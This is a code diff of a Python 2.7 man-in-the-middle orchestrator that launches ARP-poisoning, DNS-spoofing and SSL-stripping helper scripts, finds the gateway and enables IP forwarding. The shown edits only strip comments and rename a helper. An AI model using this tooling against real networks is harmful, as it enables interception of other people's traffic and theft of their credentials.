@@ -4,10 +4,8 @@
 # mitm_toolbox27.py  –  orchestrator for:
 #     • arp.py      (ARP poisoning, Py-2.7)
 #     • dns.py      (DNS spoof / relay, Py-2.7)
-#     • sslstrip.py (HTTP→HTTPS stripper, Py-2.7)
-#
-# Author: demo build 2024-06
-#
+#     • ssl.py (HTTP→HTTPS stripper, Py-2.7)
+
 
 from __future__ import print_function, absolute_import
 
@@ -18,8 +16,6 @@ import subprocess
 import sys
 import textwrap
 
-# --------------------------------------------------------------------------- #
-# helper script locations (same folder)
 
 BASE_DIR   = os.path.dirname(os.path.abspath(__file__))
 SCRIPT_ARP = os.path.join(BASE_DIR, "arp.py")
@@ -28,7 +24,6 @@ SCRIPT_SSL = os.path.join(BASE_DIR, "ssl.py")
 
 PY2 = "python2"          # explicit interpreter for children
 
-# --------------------------------------------------------------------------- #
 class Child(object):
     """Keep track of a launched helper; run each in its own process group."""
 
@@ -48,7 +43,6 @@ class Child(object):
         except KeyboardInterrupt:
             pass
 
-# --------------------------------------------------------------------------- #
 def discover_gateway():
     """Return default-gateway IPv4 string or None (Linux only)."""
     try:
@@ -83,7 +77,6 @@ def ensure_ip_forward(auto):
         print("[!] Could not enable ip_forward (need root).")
         sys.exit(1)
 
-# --------------------------------------------------------------------------- #
 def build_arp_cmd(a, gw):
     if a.arp_mode in ("pair", "silent") and not (a.victims and (a.gateway or gw)):
         return None
@@ -133,7 +126,6 @@ def build_ssl_cmd(a):
         cmd.append("--quiet")
     return cmd
 
-# --------------------------------------------------------------------------- #
 def parse_cli():
     ep = textwrap.dedent("""\
         Examples
